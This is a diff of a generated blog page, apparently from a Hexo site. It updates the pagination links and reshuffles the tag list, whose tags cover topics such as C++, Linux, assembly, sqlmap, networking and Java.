-      <a class="extend prev" rel="prev" href="/page/6/">&laquo; Prev</a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/5/">5</a><a class="page-number" href="/page/6/">6</a><span class="page-number current">7</span><a class="page-number" href="/page/8/">8</a><a class="page-number" href="/page/9/">9</a><span class="space">&hellip;</span><a class="page-number" href="/page/11/">11</a><a class="extend next" rel="next" href="/page/8/">Next &raquo;</a>
+      <a class="extend prev" rel="prev" href="/page/6/">&laquo; Prev</a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/5/">5</a><a class="page-number" href="/page/6/">6</a><span class="page-number current">7</span><a class="page-number" href="/page/8/">8</a><a class="page-number" href="/page/9/">9</a><span class="space">&hellip;</span><a class="page-number" href="/page/13/">13</a><a class="extend next" rel="next" href="/page/8/">Next &raquo;</a>
     </nav>
   
 
@@ -1181,11 +1121,15 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
           <ul class="article-tag-list" q-show="showTags">
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color1">linux</a>
+                <a href="javascript:void(0)" class="js-tag color4">C++</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">汇编</a>
+                <a href="javascript:void(0)" class="js-tag color1">Window编程原理</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color1">linux</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -1197,11 +1141,7 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color1">Window编程原理</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color4">C++</a>
+                <a href="javascript:void(0)" class="js-tag color3">android</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -1213,11 +1153,11 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color4">git</a>
+                <a href="javascript:void(0)" class="js-tag color5">hexo</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">hexo</a>
+                <a href="javascript:void(0)" class="js-tag color4">git</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -1226,6 +1166,10 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
              
               <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color5">kail</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color3">汇编</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -1245,10 +1189,6 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color2">sqlmap</a>
-              </li>
-             
-              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color1">Window内核编程</a>
               </li>
              
@@ -1257,7 +1197,7 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">笔记</a>
+                <a href="javascript:void(0)" class="js-tag color2">sqlmap</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -1265,11 +1205,15 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">随笔</a>
+                <a href="javascript:void(0)" class="js-tag color3">笔记</a>
               </li>
              
               <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color4">心理学</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color3">随笔</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -1289,11 +1233,19 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color3">随记</a>
+              </li>
+             
+              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color5">网络协议</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">随记</a>
+                <a href="javascript:void(0)" class="js-tag color3">linux优化</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color5">Java</a>
               </li>
             
             <div class="clearfix"></div>
